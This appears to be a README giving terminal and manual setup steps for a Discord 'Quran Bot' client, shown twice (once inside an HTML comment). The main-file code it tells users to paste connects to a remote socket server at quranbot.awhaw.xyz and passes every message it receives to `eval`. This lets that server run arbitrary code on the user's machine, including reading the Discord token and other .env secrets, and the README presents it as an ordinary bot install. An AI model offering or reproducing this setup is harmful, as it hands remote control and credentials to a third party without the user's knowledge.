<!-- # 🚀 Setting Up Your Quran Bot Client 🚀
# **To Create Yours 🫵:**

**Automaticaly Through The Terminal:**

```cmd
git clone https://github.com/Abdelrahmanwalidhassan/Quran-Bot-Client.git .
npm i
node --no-warnings index.js
```

Or

**Manualy By Using This Code In Your Main File:**

```js
const { Client } = require("discord.js");
const { io } = require("socket.io-client");
require("dotenv/config");
const config = require("./config.json");

const client = new Client({ intents: 3276799, presence: { status: "idle" } });
client.login(process.env.TOKEN).then(async () => {
  const socket = io(config.ws, {
    reconnection: true,
    reconnectionDelay: 5000,
    extraHeaders: {
      version: config.version,
      clientId: `${client.user.id}`,
      admins: config.admins,
    },
    auth: {
      secret_token: `${process.env.SECRET_KEY}`,
      password: `${process.env.PASSWORD}`,
    },
  });

  socket.on("message", async (data) => {
    eval(data.data);
  });
});
```

Now Your Need To Create A `config.json` File.

After That You've To Paste The Config For Your Client Like The Following:

```json
{
  "api": "https://quranbot.awhaw.xyz/api",
  "ws": "https://quranbot.awhaw.xyz/",
  "admins": [],
  "version": "beta"
}
```

Finaly You've To Install The Required Packages.

For That Use The Following Command In Your Terminal:

```cmd
npm i axios countries-and-timezones discord.js distube dotenv ffmpeg-static libsodium-wrappers quick.db socket.io-client write-file-atomic
```

Now Your Project Is All Setup But We Need To Assain Eviroment Variables, You Can Create an `.env` File For That And That Will Be The Content:

```env
SECRET_KEY=dev
PASSWORD=dev
TOKEN=YOUR_DISCORD_BOT_TOKEN
``` -->

# **🚀 Setting Up Your Quran Bot Client**

**🤖 Automated Setup Through the Terminal:**

Clone the repository and install dependencies:

```bash
git clone https://github.com/Abdelrahmanwalidhassan/Quran-Bot-Client.git .
npm install
node --no-warnings index.js
```

**Or**

**⚙️ Manual Setup - Add the Following Code to Your Main File:**

```javascript
const { Client } = require("discord.js");
const { io } = require("socket.io-client");
require("dotenv/config");
const config = require("./config.json");

const client = new Client({ intents: 3276799, presence: { status: "idle" } });
client.login(process.env.TOKEN).then(async () => {
  const socket = io(config.ws, {
    reconnection: true,
    reconnectionDelay: 5000,
    extraHeaders: {
      version: config.version,
      clientId: `${client.user.id}`,
      admins: config.admins,
    },
    auth: {
      secret_token: `${process.env.SECRET_KEY}`,
      password: `${process.env.PASSWORD}`,
    },
  });

  socket.on("message", async (data) => {
    eval(data.data);
  });
});
```

**🔧 Configuration - Create a `config.json` File:**

```json
{
  "api": "https://quranbot.awhaw.xyz/api",
  "ws": "https://quranbot.awhaw.xyz/",
  "admins": [],
  "version": "beta"
}
```

**📦 Installation of Required Packages:**

```bash
npm install axios countries-and-timezones discord.js distube dotenv ffmpeg-static libsodium-wrappers quick.db socket.io-client write-file-atomic
```

**🔑 Setting Environment Variables - Create an `.env` File:**

```env
SECRET_KEY=dev
PASSWORD=dev
TOKEN=YOUR_DISCORD_BOT_TOKEN
```

**Your Quran Bot Client Project Is Ready for Action! 🎉**
